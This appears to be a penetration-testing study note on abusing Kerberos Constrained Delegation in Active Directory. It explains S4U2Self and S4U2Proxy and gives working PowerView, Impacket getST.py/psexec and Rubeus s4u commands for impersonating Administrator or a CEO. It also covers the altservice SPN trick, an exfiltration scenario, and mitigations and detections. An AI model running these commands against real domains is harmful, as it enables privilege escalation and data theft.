---
tags: [active-directory, intermediate, privesc, vapt]
difficulty: intermediate
module: "69 - AD Access Controls and Escalation Basics"
topic: "69.13 Kerberos Constrained Delegation Basics"
---

# 13 - Kerberos Constrained Delegation Basics

## 1. Introduction to Kerberos Delegation

Kerberos Delegation is a feature in Active Directory that allows a service (such as a web server) to impersonate a user and authenticate to a backend service (such as a database) on that user's behalf. This is necessary in multi-tier architectures. For example, if User A authenticates to Web Server B, and Web Server B needs to retrieve data from SQL Server C, it must do so using User A's identity so that SQL Server C can enforce proper access controls.

There are three primary types of delegation:
1. **Unconstrained Delegation**: The server is trusted to impersonate the user to *any* other service. (Highly insecure, see [[14 - Kerberos Unconstrained Delegation Basics]]).
2. **Constrained Delegation (KCD)**: The server is trusted to impersonate the user to a *specific list* of backend services.
3. **Resource-Based Constrained Delegation (RBCD)**: The backend service itself dictates who can impersonate users to it.

This note focuses on the exploitation of **Kerberos Constrained Delegation**.

## 2. The Mechanics of Constrained Delegation

Constrained Delegation relies on two Kerberos protocol extensions introduced by Microsoft:
- **S4U2Self (Service for User to Self)**: Allows a service to request a Ticket Granting Service (TGS) ticket for *itself* on behalf of a user. The service does not need the user's password; it just needs the user's name. This is crucial for "Protocol Transition" (e.g., a user authenticates to a web server via a web form, and the server transitions this to a Kerberos identity).
- **S4U2Proxy (Service for User to Proxy)**: Allows a service to use the TGS obtained via S4U2Self to request a second TGS to a backend service specified in its `msDS-AllowedToDelegateTo` attribute.

### The Abuse Primitive
If an attacker compromises an account (user or computer) that is configured with Constrained Delegation to a target service (e.g., `cifs/DC01.domain.local`), the attacker can use S4U2Self and S4U2Proxy to forge a Kerberos ticket for an arbitrary user (including a Domain Admin) to access that target service.

Because the attacker controls the compromised account, they can request a ticket on behalf of a highly privileged user, gaining unauthorized access to the target service.

## 3. ASCII Diagram: Constrained Delegation Abuse Flow

```text
  Attacker (Controls Compromised       Key Distribution Center (KDC)           Target Service
  Web Server Service Account)          (Domain Controller)                     (e.g., CIFS on FileServer)
  +--------------------------+         +----------------------------+         +--------------------------+
  |                          |         |                            |         |                          |
  | 1. Attacker invokes      |         |                            |         |                          |
  |    S4U2Self requesting   | -------->                            |         |                          |
  |    a TGS for "Administrator"       |                            |         |                          |
  |    to "Self" (Web Server)|         |                            |         |                          |
  |                          | <--------                            |         |                          |
  | 2. KDC returns TGS for   |         |                            |         |                          |
  |    Admin to Web Server   |         |                            |         |                          |
  |                          |         |                            |         |                          |
  | 3. Attacker invokes      |         |                            |         |                          |
  |    S4U2Proxy using the   | -------->                            |         |                          |
  |    Admin TGS to request  |         |                            |         |                          |
  |    a TGS for CIFS        |         |                            |         |                          |
  |                          | <--------                            |         |                          |
  | 4. KDC verifies          |         |                            |         |                          |
  |    AllowedToDelegateTo   |         |                            |         |                          |
  |    and returns CIFS TGS  |         |                            |         |                          |
  |                          |         |                            |         |                          |
  | 5. Attacker presents the |         |                            |         |                          |
  |    CIFS TGS to the File  | ----------------------------------------------->                          |
  |    Server as "Admin"     |         |                            |         |                          |
  |                          |         |                            |         <--------------------------|
  | 6. Gains Admin Access!   | <-----------------------------------------------                          |
  +--------------------------+         +----------------------------+         +--------------------------+
```

## 4. Enumerating Constrained Delegation

To identify exploitation paths, you must query Active Directory for objects that have the `msDS-AllowedToDelegateTo` attribute populated.

### Using PowerView
```powershell
# Find user accounts with Constrained Delegation
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto

# Find computer accounts with Constrained Delegation
Get-DomainComputer -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
```

### Using BloodHound
BloodHound maps this relationship via the `AllowedToDelegate` edge. Executing a Cypher query like `MATCH p=(u)-[:AllowedToDelegate]->(c) RETURN p` will visually map these vulnerabilities.

## 5. Step-by-Step Exploitation

Assume we have compromised the NTLM hash or password of a service account `websvc` which has constrained delegation to `cifs/DC01.domain.local`.

### 5.1. Exploitation via Impacket (Linux)

Impacket provides a robust tool called `getST.py` that automates the S4U2Self and S4U2Proxy process.

```bash
# Request a Service Ticket (ST) impersonating the Administrator user for the CIFS service on DC01
python3 getST.py domain.local/websvc -hashes :<NTLM_HASH> -spn cifs/dc01.domain.local -impersonate Administrator

# The ticket will be saved as Administrator.ccache. Export it to the environment variable.
export KRB5CCNAME=Administrator.ccache

# Use the ticket to access the target service via psexec or smbclient
python3 psexec.py domain.local/Administrator@dc01.domain.local -k -no-pass
```

### 5.2. Exploitation via Rubeus (Windows)

Rubeus is the standard tool for manipulating Kerberos on Windows.

```powershell
# Step 1: Request a TGT for the compromised service account using its hash
Rubeus.exe asktgt /user:websvc /domain:domain.local /rc4:<NTLM_HASH> /nowrap

# Step 2: Use the TGT to request an S4U2Self/S4U2Proxy ticket impersonating Administrator
# The /ticket parameter uses the base64 encoded TGT from Step 1.
Rubeus.exe s4u /user:websvc /rc4:<NTLM_HASH> /impersonateuser:Administrator /msdsspn:cifs/dc01.domain.local /ptt

# Step 3: Verify the ticket is in memory
klist

# Step 4: Access the target (DC01 C$ share)
dir \\dc01.domain.local\c$
```

## 6. Any SPN Trick (Protocol Transition)
A critical feature of Kerberos implementation in AD is that if you have Constrained Delegation rights to *one* service on a server (e.g., `time/DC01`), you effectively have rights to *any* service on that server (e.g., `cifs/DC01`, `ldap/DC01`, `http/DC01`). 

The Service Principal Name (SPN) string is not cryptographically verified during the service ticket decryption phase; only the secret key is. Since all services running under the context of the computer account (SYSTEM) share the same machine account password, a ticket forged for `time/DC01` can be manually altered to point to `cifs/DC01`, and the target server will accept it. 

Rubeus handles this automatically with the `/altservice` flag:
```powershell
Rubeus.exe s4u /user:websvc /rc4:<NTLM_HASH> /impersonateuser:Administrator /msdsspn:time/dc01.domain.local /altservice:cifs /ptt
```

## 7. Defending and Detecting Constrained Delegation Abuse

### 7.1. Mitigation
- **Remove unnecessary delegation**: Regularly audit the `msDS-AllowedToDelegateTo` attribute. If a service does not absolutely require it, remove it.
- **Sensitive Accounts**: Ensure highly privileged accounts (e.g., Domain Admins) are members of the `Protected Users` group, or have the "Account is sensitive and cannot be delegated" flag checked. This prevents their identities from being impersonated via S4U.
- **Migrate to RBCD**: Move away from traditional KCD and adopt Resource-Based Constrained Delegation, which offers a more secure, target-centric access control model.

### 7.2. Detection
- **Event ID 4769 (A Kerberos service ticket was requested)**: Monitor for S4U2Self requests. A massive influx of TGS requests for the service itself on behalf of different users is suspicious.
- **Honey Tokens**: Create fake accounts with "AllowedToDelegateTo" properties pointing to honeypots. Monitor for any Kerberos interactions with these accounts.
- **SIEM Rules**: Alert when a ticket is requested for a highly privileged user originating from a service account known to have delegation rights.

## Real-World Attack Scenario

A threat actor compromised a public-facing IIS web server (`WEB-EXT-01`) belonging to an insurance company. They managed to dump the local LSASS memory and extract the NTLM hash for the service account running the web application, `svc_web`.

Using PowerView, the attacker enumerated the domain and checked for delegation rights. They discovered that `svc_web` was configured with Kerberos Constrained Delegation (KCD) to the CIFS (SMB) service on the company's central file server (`FILE-CORP-01`):
`Get-DomainUser svc_web | Select-Object msds-allowedtodelegateto` returned `cifs/FILE-CORP-01`.

**The Execution:**
1. The attacker realized they could use KCD to forge a ticket impersonating *any* user to access the file server. They decided to impersonate the CEO to access highly confidential M&A documents.
2. Operating from a Linux pivot machine, the attacker used Impacket's `getST.py` script. They provided the compromised hash of `svc_web` and executed the S4U2Self and S4U2Proxy attacks:
   `python3 getST.py domain.local/svc_web -hashes :<NtlmHash> -spn cifs/FILE-CORP-01 -impersonate CEO_User`
3. The script successfully negotiated with the Domain Controller, which returned a valid Kerberos Service Ticket (TGS) for the CIFS service, explicitly granting access as `CEO_User`.
4. The attacker exported the ticket to their environment: `export KRB5CCNAME=CEO_User.ccache`.

**The Outcome:**
Using `smbclient.py`, the attacker authenticated to `FILE-CORP-01` using the forged Kerberos ticket. The file server accepted the ticket, believing the connection originated from the CEO. The attacker navigated directly to the restricted `\\FILE-CORP-01\Executive_Share$` and exfiltrated sensitive merger and acquisition documents. The attack completely bypassed file-level ACLs without requiring the CEO's actual password or triggering MFA.

## 8. Chaining Opportunities

- Identifying a Constrained Delegation path often follows initial enumeration with tools like BloodHound or PowerView.
- After obtaining a TGS via `getST.py`, attackers often chain it with DCSync (if the target service is `ldap` or `cifs` on a Domain Controller) to dump the entire Active Directory database.
- It can be used in tandem with [[12 - Exploiting LAPS Local Administrator Password Solution Basics]] if the delegated server holds LAPS credentials in memory.

## 9. Related Notes
- [[11 - Bypassing UAC User Account Control]]
- [[12 - Exploiting LAPS Local Administrator Password Solution Basics]]
- [[14 - Kerberos Unconstrained Delegation Basics]]
- [[15 - Defending Against Basic AD Attacks]]
- [[04 - Active Directory Enumeration via BloodHound]]
- [[22 - Abuse of Resource-Based Constrained Delegation (RBCD)]]
